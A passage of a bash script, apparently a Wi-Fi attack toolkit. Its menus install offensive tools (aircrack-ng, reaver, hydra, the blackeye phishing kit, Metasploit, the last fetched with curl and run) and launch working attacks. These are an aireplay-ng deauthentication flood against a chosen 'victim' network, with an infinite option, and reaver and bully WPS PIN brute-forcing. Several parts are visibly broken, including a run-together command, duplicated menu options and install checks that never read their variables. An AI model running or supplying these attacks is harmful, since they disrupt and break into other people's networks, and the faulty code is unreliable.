    if [[ $install_option = 0 ||  $install_option = 00 ]]
    then
        main_menu
    elif [[ $install_option = 1 || $install_option = 01 ]]
    then

        sniffing_menuapt-get install -y net-tools build-essential ruby-dev libpcap-dev wireless_tools iw aircrack-ng pkg-config libnl-3-dev libnl-genl-3-dev libpcap-dev reaver nmap xterm iproute2 curl gawk crunch libnl-genl-3-dev build-essential git autoconf automake libtool pkg-config libnl-3-dev libssl-dev libpcre3-dev hashcat john hydra rkhunter tcpdump
        mkdir /root/tehR4V10L1script 2>/dev/null
        mkdir /root/tehR4V10L1script/installs 2>/dev/null
        cd /root/tehR4V10L1script/installs
        cd r4v10l1_temp_files
        git clone https://github.com/aircrack-ng/mdk4
        git clone https://github.com/aanarchyy/bully/
        git clone https://github.com/wiire-a/pixiewps
        git clone https://github.com/thelinuxchoice/blackeye
        cd /root/tehR4V10L1script/installs/mdk4
        make
        make install
        cd /root/tehR4V10L1script/installs/bull*/scr
        make
        make install
        cd .. && make && make install
        cd /root/tehR4V10L1script/installs/pixiewps*
        make
        make install
        gem install bettercap
        cd
        echo
        echo
        echo -e "${red_color} All${white_color} installed successfully!${normal_color}"
        sleep 3
        install_tools

    elif [[ $install_option = 2 ||  $install_option = 02 ]]
    then
        apt-get install -y net-tools
        echo
        echo -e "${red_color_slim} Net-tools${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 3 ||  $install_option = 03 ]]
    then
        apt-get install -y wireless_tools
        echo
        echo -e "${red_color_slim} Wireless-tools${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 4 ||  $install_option = 04 ]]
    then
        apt-get install -y iw
        echo
        echo -e "${red_color_slim} Iw${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 5 ||  $install_option = 05 ]]
    then
        apt-get install -y aircrack-ng
        echo
        echo -e "${red_color_slim} Aircrack-ng${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 6 ||  $install_option = 06 ]]
    then
        apt-get install -y reaver
        echo
        echo -e "${red_color_slim} Reaver${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 7 ||  $install_option = 07 ]]
    then
        apt-get install -y nmap
        echo
        echo -e "${red_color_slim} Nmap${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools

    elif [[ $install_option = 8 ||  $install_option = 08 ]]
    then
        apt-get install -y xterm
        echo
        echo -e "${red_color_slim} Xterm${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 9 ||  $install_option = 09 ]]
    then
        apt-get install -y iproute2
        echo
        echo -e "${red_color_slim} Iproute2${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 10 ]]
    then
        apt-get install -y curl
        echo
        echo -e "${red_color_slim} Curl${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 11 ]]
    then
        apt-get install -y gawk
        echo
        echo -e "${red_color_slim} Awk${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools

    elif [[ $install_option = 12 ]]
    then
        apt-get install -y crunch
        echo
        echo -e "${red_color_slim} Crunch${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 13 ]]
    then
        apt install libnl-genl-3-dev build-essential git autoconf automake libtool pkg-config libnl-3-dev libssl-dev libpcre3-dev pkg-config libnl-3-dev libnl-genl-3-dev libpcap-dev
        cd /root
        mkdir /root/tehR4V10L1script 2>/dev/null
        mkdir /root/tehR4V10L1script/installs 2>/dev/null
        cd /root/tehR4V10L1script/installs
        git clone https://github.com/aircrack-ng/mdk4
        cd mdk4
        make
        make install
        echo
        echo -e "${red_color_slim} Mdk4${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 14 ]]
    then
        apt-get install -y hashcat
        echo
        echo -e "${red_color_slim} Hashcat${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 15 ]]
    then
        apt install libnl-genl-3-dev build-essential git autoconf automake libtool pkg-config libnl-3-dev libssl-dev libpcre3-dev
        mkdir /root/tehR4V10L1script 2>/dev/null
        mkdir /root/tehR4V10L1script/installs 2>/dev/null
        cd /root/tehR4V10L1script/installs
        git clone https://github.com/aanarchyy/bully/
        cd /root/tehR4V10L1script/installs/bull*/scr
        make
        make install
        cd .. && make && make install
        echo
        echo -e "${red_color_slim} Bully${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 16 ]]
    then
        apt install libnl-genl-3-dev build-essential git autoconf automake libtool pkg-config libnl-3-dev libssl-dev libpcre3-dev
        cd /root
        mkdir /root/tehR4V10L1script 2>/dev/null
        mkdir /root/tehR4V10L1script/installs 2>/dev/null
        cd /root/tehR4V10L1script/installs
        git clone https://github.com/wiire-a/pixiewps
        cd pixie*
        make
        make install
        echo
        echo -e "${red_color_slim} Pixiewps${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 17 ]]
    then
        apt-get install -y john
        echo
        echo -e "${red_color_slim} John${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 18 || $install_option = 19 ]]
    then
        curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
        echo
        echo -e "${red_color_slim} Metasploit / Msfvenom${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 19 ]]
    then
        apt-get install -y hydra
        echo
        echo -e "${red_color_slim} Hydra${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 20 ]]
    then
        apt-get install -y rkhunter
        echo
        echo -e "${red_color_slim} Rkhunter${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 21 ]]
    then
        apt-get install -y tcpdump
        echo
        echo -e "${red_color_slim} Tcpdump${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 22 ]]
    then
        apt-get install -y sshpass
        echo
        echo -e "${red_color_slim} Sshpass${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 23 ]]
    then
        apt install libnl-genl-3-dev build-essential git autoconf automake libtool pkg-config libnl-3-dev libssl-dev libpcre3-dev
        cd
        mkdir /root/tehR4V10L1script 2>/dev/null
        mkdir /root/tehR4V10L1script/installs 2>/dev/null
        cd /root/tehR4V10L1script/installs
        git clone https://github.com/thelinuxchoice/blackeye
        echo
        echo -e "${red_color_slim} Blackeye${white_color} cloned successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 24 ]]
    then
        apt-get install -y build-essential ruby-dev libpcap-dev
        gem install bettercap
        echo
        echo -e "${red_color_slim} Bettercap${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 25 ]]
    then
        apt install git python python3 python3-pip python-pip
        cd
        mkdir /root/tehR4V10L1script 2>/dev/null
        mkdir /root/tehR4V10L1script/installs 2>/dev/null
        cd /root/tehR4V10L1script/installs
        git clone https://github.com/threat9/routersploit
        cd /root/tehR4V10L1script/installs/routersploit
        pip3 install -r requirements.txt && pip3 install -r requirements-dev.txt
        echo
        echo -e "${red_color_slim} Routersploit${white_color} cloned and installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    elif [[ $install_option = 24 ]]
    then
        apt-get install -y kismet
        echo
        echo -e "${red_color_slim} Kismet${white_color} installed successfully!${normal_color}"
        sleep 1.5
        install_tools
    else
        echo
        echo -e "${red_color}    \(╰◣▂ ◢╯)Ψ   ${white_color}Wrong option!"
        sleep 1
        install_tools
    fi
}
# pip
function public_ip () {
	clear
    echo
	echo -e "${white_color}  Please wait..."
	CHECKMON=$(ifconfig | grep "mon")
    sleep 0.5
	if [[ "$CHECKMON" = "" ]]
	then
		echo
		PUBLICIP=$(curl -s ipinfo.io/ip)
		if [[ "$PUBLICIP" = "" ]]
		then
			echo
			PUBLICIP="${red_color}Connection error.${normal_color}"
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            main_menu
	    else
            echo -e "${white_color}  Your public IP is ${red_color_slim}[${white_color} ${PUBLICIP} ${red_color_slim}]${normal_color}"
            echo
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            main_menu
        fi

	else
		echo -e "${white_color}Monitor mode enabled, I can't access internet!"
		echo -e "You can select 'man) Managed' to disable monitor mode.${normal_color}"
		echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
	fi
    main_menu
}
# mon
function monitor_mode () {

    clear
    echo
    echo -ne "${red_color_slim} [ ${white_color}Interface name${red_color_slim} ]${normal_color}"
                echo -ne  " > " ;tput sgr0
    read interface_name_managed
    echo
    echo -e "${white_color} Changing...${normal_color}"
    airmon-ng start ${interface_name_managed} 1>/dev/null
    echo -e "${white_color} Done!${normal_color}"
    echo
    echo -ne "${white_color} Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
    read -p ""
    main_menu


}
# cmm
function monitor_mode_custom_channel () {

    clear
    echo
    echo -ne "${red_color_slim} [ ${white_color}Interface name${red_color_slim} ]${normal_color}"
                echo -ne  " > " ;tput sgr0
    read interface_name_managed
    echo
    echo -ne "${red_color_slim} [ ${white_color}Channel for the monitor mode${red_color_slim} ]${normal_color}"
                echo -ne  " > " ;tput sgr0
    read monitor_channel
    echo
    echo -e "${white_color} Changing...${normal_color}"
    airmon-ng start ${interface_name_managed} ${monitor_channel} 1>/dev/null
    echo -e "${white_color} Done!${normal_color}"
    echo
    echo -ne "${white_color} Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
    read -p ""
    main_menu

}
# man
function managed_mode () {

    clear
    echo
    echo -ne "${red_color_slim} [ ${white_color}Interface name${red_color_slim} ]${normal_color}"
                echo -ne  " > " ;tput sgr0
    read interface_name_monitor
    echo
    echo -e "${white_color} Changing...${normal_color}"
    airmon-ng stop ${interface_name_monitor} 1>/dev/null
    echo -e "${white_color} Done!${normal_color}"
    echo
    echo -ne "${white_color} Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
    read -p ""
    main_menu


}
# if
function if_option () {

    clear
    echo
    ifconfig
    echo
    echo -ne "${white_color} Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
    read -p ""
    main_menu

}
# lip
function just_local_ip () {

    clear
    CHECKMON=$(ifconfig | grep "mon")
	if [[ "$CHECKMON" = "" ]]
	then
        echo
        echo -ne "${red_color_slim} [ ${white_color}Interface name${red_color_slim} ]${normal_color}"
                    echo -ne  " > " ;tput sgr0
        read interface_name_managed
        echo
        echo -e " ${white_color}Your local IP is ${red_color_slim}[${white_color} $(ifconfig ${interface_name_managed} | head -n2 | tail -n1 | awk '{print $2}')${red_color_slim} ]${normal_color}"
        echo
        echo -ne "${white_color} Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    else
        echo -e "${white_color}Monitor mode enabled, I can't access internet!"
		echo -e "You can select 'man) Managed' to disable monitor mode.${normal_color}"
		echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    fi


}
# iw
function iw_option () {

    clear
    echo
    iwconfig
    echo
    echo -ne "${white_color} Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
    read -p ""
    main_menu

}
# png
function ping_ip () {

    clear
    echo
    CHECKMON=$(ifconfig | grep "mon")
    if [[ "$CHECKMON" = "" ]]
    then
        echo -ne "${red_color_slim} [ ${white_color}IP you want to ping${red_color_slim} ]${normal_color}"
                    echo -ne  " > " ;tput sgr0
        read ip2ping
        PING_RESULTS=$(ping -c 5 ${ip2ping} | grep "Unreachable")
        if [[ $PING_RESULTS = "" ]]
        then
            echo
            echo -e "${red_color_slim} [ ${white_color}${ip2ping}${red_color_slim} ]${white_color} is up!${normal_color}"
            echo
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            main_menu
        else
            echo
            echo -e "${red_color_slim} [ ${white_color}${ip2ping}${red_color_slim} ]${white_color} is ${red_color} down!${normal_color}"
            echo
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            main_menu
        fi
    else
        echo -e "${white_color}Monitor mode enabled, I can't scan right!"
        echo -e "You can select 'man) Managed' to disable monitor mode.${normal_color}"
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    fi

}
# scn
function scan_networks () {

    clear
	echo
    echo -ne "${red_color_slim} [ ${white_color}Interface name${red_color_slim} ]${normal_color}"
                    echo -ne  " > " ;tput sgr0
    read interface_name_monitor

    clear
    CHECKMON=$(ifconfig | grep "mon")
    if [[ "$CHECKMON" = "" ]]
    then

        echo -e "${white_color}  Managed mode enabled, I can't scan the networks!${normal_color}"
        echo -e "${white_color}  Do you want to activate monitor mode in ${red_color_slim} ${interface_name_monitor}${white_color}? ${normal_color}"
        echo -ne "${white_color}   [ Y / N ]"
                    echo -ne  " > " ;tput sgr0
        read port_canning_option
        if [[ $port_canning_option = y || $port_canning_option = Y ]]
        then
            echo
            airmon-ng start ${interface_name_monitor} 1>/dev/null
            echo
            echo -e "${white_color}  Done! ${normal_color}"
            echo -e "${white_color}  I'll iwconfig for you so you can see the interface name. ${normal_color}"
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            clear
            iwconfig
            echo
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            scan_networks
        else
            main_menu
        fi

    else
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to scan.${normal_color}"
        read -p ""
        clear
        airodump-ng -i ${interface_name_monitor}
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        airmon-ng stop ${interface_name_monitor} 1>/dev/null
        main_menu
    fi
    main_menu

}

function credits () {

    clear
    echo
    echo -e "${white_color}                   ▂▃▅▇█▓▒░[CREDITS & MENTIONS]░▒▓█▇▅▃▂"
    echo
    echo -e "${white_color}  All this script was writen by r4v10l1 (${red_color}http://github.com/r4v10l1${white_color})"
    echo
    echo -e "  ${red_color_slim}This script was based in scripts like${white_color}: "
    echo -e "     - Airgeddon (https://github.com/v1s1t0r1sh3r3/airgeddon)"
    echo -e "     - The lazy script (https://github.com/arismelachroinos/lscript)"
    echo
    echo -e "  ${red_color_slim}Other recomended repositories${white_color}:"
    echo -e "     - SSH bruteforcer (https://github.com/R4stl1n/SSH-Brute-Forcer) "
    echo -e "       (My bruteforce is done with hydra but this is in python so check it out :] )"
    echo -e "     - Katoolin (https://github.com/LionSec/katoolin) (Python kali tool installer. Very cool)"
    echo -e "     - Blackeye (https://github.com/thelinuxchoice/blackeye)"
    echo -e "     - PixieWps (https://github.com/wiire-a/pixiewps)"
    echo -e "     - Routersploit (https://github.com/threat9/routersploit)"
    echo -e "     - Mdk4 (https://github.com/aircrack-ng/mdk4)"
    echo -e "     - Brannon Dorsey (https://github.com/brannondorsey) (This guy is god)"
    echo -e "         - WiFi cracking (https://github.com/brannondorsey/wifi-cracking) (Nice for learning ;] )"
    echo -e "         - Bash sniff probes (https://github.com/brannondorsey/sniff-probes) (Very helpful for me, nice work Brannon)"
    echo -e "     - Python probe sniffer (https://github.com/xdavidhu/probeSniffer)"
    echo -e "       (The intention was to not use python in this script, but cool anyway :] )"
    echo
    echo -e "  ${red_color_slim}Honorable mentions${white_color}:"
    echo -e "     - Mr. Pablusko (${red_color}@Hall9002${white_color})"
    echo -e "     - Señor Foo (${red_color}@foozer${white_color})${normal_color}"
    echo
    echo -ne "${white_color} Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
    read -p ""
    main_menu

}
##########################################################
# 001
function global_wifi_menu () {

    clear
    echo
    echo -e "${red_color_slim} [${white_color} WiFi menu ${red_color_slim}]${normal_color}"
    echo
    echo -e "${white_color}  01) ${normal_color}Deauth menu${normal_color}"
    echo -e "${white_color}  02) ${normal_color}WPS menu${normal_color}"
    echo -e "${white_color}  03) ${normal_color}Handshake menu"
    echo -e "${white_color}  04) ${normal_color}Offline handshake menu"
    echo -e "${white_color}  05) ${normal_color}Sniffing menu"
    echo -e "${white_color}  06) ${normal_color}Check router vulnerabilities with routersploit"
    echo -e "${white_color}  00) ${normal_color}Back${normal_color}"
    echo
    echo -ne "${white_color} [Option]"
                echo -ne  "   > " ;tput sgr0
    read global_wifi_option

    if [[ $global_wifi_option = 0 ||  $global_wifi_option = 00 ]]
    then
        main_menu
    elif [[ $global_wifi_option = 1 || $global_wifi_option = 01 ]]
    then
        deauth_menu
    elif [[ $global_wifi_option = 2 || $global_wifi_option = 02 ]]
    then
        wps_menu
    #!##############################################################
    # elif [[ $global_wifi_option = 3 || $global_wifi_option = 03 ]]
    # then
    #     handshake_menu
    #!##############################################################
    elif [[ $global_wifi_option = 4 || $global_wifi_option = 04 ]]
    then
        handshake_offline_menu

    elif [[ $global_wifi_option = 5 || $global_wifi_option = 05 ]]
    then
        sniffing_menu

    elif [[ $global_wifi_option = 6 || $global_wifi_option = 06 ]]
    then
        exec_routersploit
    else
        echo
        echo -e "${red_color}    \(╰◣▂ ◢╯)Ψ   ${white_color}Wrong option!"
        sleep 1
        global_wifi_menu
    fi

}
# 001.1
function deauth_menu () {

    clear
    echo
    echo -e "${red_color_slim} [${white_color} Deauth menu ${red_color_slim}]${normal_color}"
    echo
    echo -e "${white_color} 01) ${normal_color}Aireplay deauth${normal_color}"
    echo -e "${white_color} 00)${normal_color} Back${normal_color}"
    echo
    echo -e "${white_color} [Option]"
                echo -ne  "   > " ;tput sgr0
    read deauth_option

    if [[ $deauth_option = 0 ||  $deauth_option = 00 ]]
    then
        main_menu
    elif [[ $deauth_option = 1 || $deauth_option = 01 ]]
    then
        aireplay_deauth
    else
        echo
        echo -e "${red_color}    \(╰◣▂ ◢╯)Ψ   ${white_color}Wrong option!"
        sleep 1
        deauth_menu
    fi

}
# 001.1.1
function aireplay_deauth() {

    clear
    echo -e "${red_color_slim}                   [${white_color} AIREPLAY DEAUTH ${red_color_slim}]"
	echo
    echo
    echo -ne "${red_color_slim} [ ${white_color}Interface name${red_color_slim} ]${normal_color}"
                    echo -ne  " > " ;tput sgr0
    read interface_name_monitor


    CHECKMON=$(ifconfig | grep "mon")
    if [[ "$CHECKMON" = "" ]]
    then
        echo -e "${white_color}  Managed mode enabled, I can't run the deauth!${normal_color}"
        echo -e "${white_color}  Do you want to activate monitor mode in ${red_color_slim} ${interface_name_monitor}${white_color}? ${normal_color}"
        echo -ne "${white_color}   [ Y / N ]"
                    echo -ne  " > " ;tput sgr0
        read deauth_option
        if [[ $deauth_option = y || $deauth_option = Y ]]
        then
            echo
            # echo -ne "${white_color}  [ Interface channel ]"
            #         echo -ne  " > " ;tput sgr0
            # read deauth_channel
            # airmon-ng start ${interface_name_monitor} ${deauth_channel} 1> /dev/null
            airmon-ng start ${interface_name_monitor} 1>/dev/null
            echo
            echo -e "${white_color}  Done! ${normal_color}"
            echo -e "${white_color}  I'll iwconfig for you so you can see the interface name. ${normal_color}"
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            clear
            iwconfig
            echo
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            aireplay_deauth
        else
            deauth_menu
        fi

    else

        echo
        echo -e "${white_color}  Now I will run airodump-ng to select the BSSID of the victim. Press Ctrl + C to stop it."
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        # airodump-ng -i ${interface_name_monitor}
        # cd /root/tehR4V10L1script/tempfiles/airodump
        airodump-ng -w /root/tehR4V10L1script/tempfiles/airodump/r4v10l1_interrupt_package --output-format csv ${interface_name_monitor}
        echo
        echo -ne "${white_color} [ BSSID ]"
                    echo -ne  "   > " ;tput sgr0
        read victims_bssid

        # mv /root/tehR4V10L1script/tempfiles/airodump/r4v10l1_interrupt_package* /root/tehR4V10L1script/tempfiles/airodump${victims_bssid}_1.csv

        echo
        echo -ne "${white_color} [ CHANNEL ]"
                    echo -ne  "   > " ;tput sgr0
        read victims_channel

        # echo -ne "${white_color} [ ESSID ]"
        #             echo -ne  "   > " ;tput sgr0
        # read victims_essid
        echo -e "${white_color}  Done! ${normal_color}"
        echo
        echo -e "${white_color}  Now the program will get the channel of the victim to restart the monitor interface in the correct way. ${normal_color}"
        # victims_channel=$(cat /root/tehR4V10L1script/tempfiles/airodump/${victims_bssid}*.csv | grep -i ${victims_bssid} | head -n1 | tail -n1 | awk '{print substr($6, 1, length($6)-1)}')
        cd
        # rm -r /root/tehR4V10L1script/tempfiles
        airmon-ng stop ${interface_name_monitor} 1>/dev/null
        echo
        echo -ne "${red_color_slim} [ ${white_color}Interface name ( Managed mode )${red_color_slim} ]${normal_color}"
                        echo -ne  " > " ;tput sgr0
        read interface_name_managed
        airmon-ng start ${interface_name_managed} ${victims_channel} 1>/dev/null
        echo
        echo -ne "${red_color_slim} [ ${white_color}Number of \"deauths\" (Put 0 for infinite)${red_color_slim} ]${normal_color}"
                        echo -ne  " > " ;tput sgr0
        read aireplay_times
        echo
        echo -e "${white_color}  All done! ${normal_color}"
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to start the attack.${normal_color}"
        read -p ""
        clear
        # aireplay-ng -0 0 -a ${victims_bssid} ${interface_name_monitor}
        # aireplay-ng -0 0 -e ${victims_essid} ${interface_name_monitor}
        xterm -geometry 100x50 -fa "Monospace" -fs "8"  -T "[ tehR4V10L1script ]-[ aireplay deauth ]" -e aireplay-ng --deauth ${aireplay_times} -a ${victims_bssid} --ignore-negative-one ${interface_name_monitor} 2>/dev/null
        echo
        echo -e "${white_color}  Attack finished! ${normal_color}"
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        # airmon-ng stop ${interface_name_monitor}
        deauth_menu
    fi
    deauth_menu
}
# 001.2
function wps_menu () {

    clear
    echo
    echo -e "${red_color_slim} [${white_color} WPS menu ${red_color_slim}]${normal_color}"
    echo
    echo -e "${white_color} 01) ${normal_color}Bruteforce WPS pin with reaver${normal_color}"
    echo -e "${white_color} 02) ${normal_color}Bruteforce WPS pin with bully and pixiewps${normal_color}"
    echo -e "${white_color} 00)${normal_color} Back${normal_color}"
    echo
    echo -e "${white_color} [Option]"
                echo -ne  "   > " ;tput sgr0
    read wps_option

    if [[ $wps_option = 0 ||  $wps_option = 00 ]]
    then
        global_wifi_menu
    elif [[ $wps_option = 1 || $wps_option = 01 ]]
    then
        reaver_wps_pin_hack
    elif [[ $wps_option = 2 || $wps_option = 02 ]]
    then
        bully_wps_pin_hack
    else
        echo
        echo -e "${red_color}    \(╰◣▂ ◢╯)Ψ   ${white_color}Wrong option!"
        sleep 1
        wps_menu
    fi


}
# 001.2.1
function reaver_wps_pin_hack () {
    clear
    echo -e "${red_color_slim}                   [${white_color} REAVER WPS PIN BRUTEFORCE ${red_color_slim}]"
    echo
    echo
    CHECKINSTALL_REAVER=$(which reaver)
    if [[ CHECKINSTALL_REAVER = "" ]]
    then
        echo -e "${red_color_slim}  [${white_color} Reaver ${red_color_slim}] ${white_color} is not installed! You can install it in the \"ins)\" menu."
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    else
        CHECKFOLDER_REAVER=$(ls -la /etc | grep reaver)
        if [[ $CHECKFOLDER_REAVER = "" ]]
        then
            echo -e "${red_color} /etc/reaver ${white_color}not found! Creating...${normal_color}"
            mkdir /etc/reaver
            sleep 0.5
            echo -e "${red_color_slim} /etc/reaver ${white_color}created! Resuming...${normal_color}"
        else
            echo -e "${red_color_slim} /etc/reaver ${white_color}found! Resuming...${normal_color}"
        fi
        echo
        echo -ne "${red_color_slim} [ ${white_color}Interface name${red_color_slim} ]${normal_color}"
                        echo -ne  " > " ;tput sgr0
        read interface_name_monitor

        CHECKMON=$(ifconfig | grep "mon")
        if [[ "$CHECKMON" = "" ]]
        then
            echo
            echo -e "${white_color}  Managed mode enabled, I can't run the deauth!${normal_color}"
            echo -e "${white_color}  Do you want to activate monitor mode in ${red_color_slim} ${interface_name_monitor}${white_color}? ${normal_color}"
            echo -ne "${white_color}   [ Y / N ]"
                        echo -ne  " > " ;tput sgr0
            read monitor_option
            if [[ $monitor_option = y || $monitor_option = Y ]]
            then
                pantalla_de_carga
                pantalla_de_carga
                echo
                airmon-ng start ${interface_name_monitor} 1>/dev/null
                echo
                echo -e "${white_color}  Done! ${normal_color}"
                echo -e "${white_color}  I'll iwconfig for you so you can see the interface name. ${normal_color}"
                echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
                read -p ""
                clear
                iwconfig
                echo
                echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
                read -p ""
                reaver_wps_pin_hack
            else
                wps_menu
            fi
        fi

        echo
        echo -e "${white_color}  I'll run wash. It will stop after 15 seconds. ${red_color}DO NOT ${red_color_slim}Ctrl + C ${normal_color}"
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        clear
        timeout --preserve-status 15 wash -i ${interface_name_monitor} 2>/dev/null
        echo
        echo
        echo -ne "${red_color_slim} [ ${white_color}BSSID${red_color_slim} ]${normal_color}"
                        echo -ne  " > " ;tput sgr0
        read victims_bssid
        echo
        echo -ne "${red_color_slim} [ ${white_color}ESSID${red_color_slim} ]${normal_color}"
                        echo -ne  " > " ;tput sgr0
        read victims_essid
        echo
        echo -ne "${red_color_slim} [ ${white_color}CHANNEL${red_color_slim} ]${normal_color}"
                        echo -ne  " > " ;tput sgr0
        read victims_channel
        echo
        echo -e "${white_color}  All done! ${normal_color}"
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to start the attack.${normal_color}"
        read -p ""
        xterm -geometry 100x50  -fa "Monospace" -fs "8" -T "[ tehR4V10L1script ]-[ reaver atack ]" -e reaver -i ${interface_name_monitor} -b ${victims_bssid} -c ${victims_channel} -e ${victims_essid} -d 15 -vv 2>/dev/null
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        wps_menu
    fi
    main_menu
}
# 001.2.2
function bully_wps_pin_hack () {

    clear
    echo -e "${red_color_slim}                   [${white_color} BULLY WPS BRUTEFORCE ${red_color_slim}]"
    echo
    CHECKINSTALL_REAVER=$(which reaver)
    CHECKINSTALL_BULLY=$(which bully)
    if [[ CHECKINSTALL_BULLY = "" && CHECKINSTALL_REAVER = "" ]]
    then
        echo
        echo -e "${red_color_slim}  [${white_color} Reaver ${red_color_slim}] ${white_color} is not installed! You can install it in the \"ins)\" menu."
        echo
        echo -e "${red_color_slim}  [${white_color} Bully ${red_color_slim}] ${white_color} is not installed! You can install it in the \"ins)\" menu."
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    elif [[ CHECKINSTALL_REAVER = "" && CHECKINSTALL_BULLY != "" ]]
    then
        echo
        echo -e "${red_color_slim}  [${white_color} Reaver ${red_color_slim}] ${white_color} is not installed! You can install it in the \"ins)\" menu."
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    elif [[ CHECKINSTALL_REAVER != "" && CHECKINSTALL_BULLY = "" ]]
    then
        echo
        echo -e "${red_color_slim}  [${white_color} Bully ${red_color_slim}] ${white_color} is not installed! You can install it in the \"ins)\" menu."
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    else
        CHECKFOLDER_REAVER=$(ls -la /etc | grep reaver)
        if [[ $CHECKFOLDER_REAVER = "" ]]
        then
            echo
            echo -e "${red_color} /etc/reaver ${white_color}not found! Creating...${normal_color}"
            mkdir /etc/reaver
            sleep 0.5
            echo -e "${red_color_slim} /etc/reaver ${white_color}created! Resuming...${normal_color}"
        else
            echo -e "${red_color_slim} /etc/reaver ${white_color}found! Resuming...${normal_color}"
        fi
        echo
        echo -ne "${red_color_slim} [ ${white_color}Interface name${red_color_slim} ]${normal_color}"
                        echo -ne  " > " ;tput sgr0
        read interface_name_monitor

        CHECKMON=$(ifconfig | grep "mon")
        if [[ "$CHECKMON" = "" ]]
        then
            clear
            echo -e "${white_color}  Managed mode enabled, I can't run the deauth!${normal_color}"
            echo -e "${white_color}  Do you want to activate monitor mode in ${red_color_slim} ${interface_name_monitor}${white_color}? ${normal_color}"
            echo -ne "${white_color}   [ Y / N ]"
                        echo -ne  " > " ;tput sgr0
            read monitor_option
            if [[ $monitor_option = y || $monitor_option = Y ]]
            then
                echo
                airmon-ng start ${interface_name_monitor} 1>/dev/null
                echo
                echo -e "${white_color}  Done! ${normal_color}"
                echo -e "${white_color}  I'll iwconfig for you so you can see the interface name. ${normal_color}"
                echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
